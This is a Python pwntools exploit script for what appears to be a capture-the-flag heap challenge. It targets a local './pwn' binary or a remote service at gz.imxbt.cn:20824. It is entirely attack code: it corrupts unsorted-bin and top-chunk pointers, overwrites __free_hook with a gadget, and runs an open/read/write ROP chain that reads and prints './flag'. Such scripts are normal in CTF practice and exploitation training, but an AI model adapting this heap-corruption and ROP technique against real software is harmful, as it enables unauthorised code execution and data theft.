from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./pwn"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote("gz.imxbt.cn", 20824)


def ddebug(b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    pause()

# u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))

def add(idx, content):
    io.sendlineafter("choice:\n", "1")
    io.sendlineafter("idx:", str(idx))
    io.sendafter("you want to say\n", content)

def delete(idx):
    io.sendlineafter("choice:\n", "2")
    io.sendlineafter("idx:", str(idx))

def edit(idx, content):
    io.sendlineafter("choice:\n", "3")
    io.sendlineafter("idx:", str(idx))
    io.sendafter("context:", content)

p_chunk = 0x6CCD60
unsort_bin = 0x6ca858

add(0, "0")
add(1, "1")
delete(0)
edit(0, p64(0)+p64(p_chunk-0x10))
add(2, b"tinyfat")
ddebug("b *0x400DAF  \n set glibc 2.23\n continue")
edit(0, p64(p_chunk)+p64(0)+p64(unsort_bin)*2) # 改topchunk+清空unsorted_bin

add(0, p64(p_chunk))

free_hook = 0x6cc5e8
magic=0x4b8fb8

# edit(2, p64(free_hook))
edit(2,p64(0x6CCD68)+p64(0x6CCD70)+p64(0)*4)
edit(0,p64(free_hook)+p64(0x6CCE40)+b"./flag\x00\x00")
edit(1,p64(magic))

flag=0x6ccd78
rdi=0x401a16
rsi=0x401b37
rdx=0x443136
rax=0x41fc84
syscall=0x4678e5
payload =p64(rdi)+p64(flag)+p64(rsi)+p64(0)+p64(rdx)+p64(0)+p64(rax)+p64(2)+p64(syscall)
payload+=p64(rdi)+p64(3)+p64(rsi)+p64(0x6CBBA0)+p64(rdx)+p64(0x60)+p64(rax)+p64(0)+p64(syscall)
payload+=p64(rdi)+p64(1)+p64(rax)+p64(1)+p64(syscall)
edit(2,payload)
delete(2)
#ddebug("b *0x41e985 \nset glibc 2.23\n continue")

"""
0x000000000041fc84 : pop rax ; ret
"""



io.interactive()



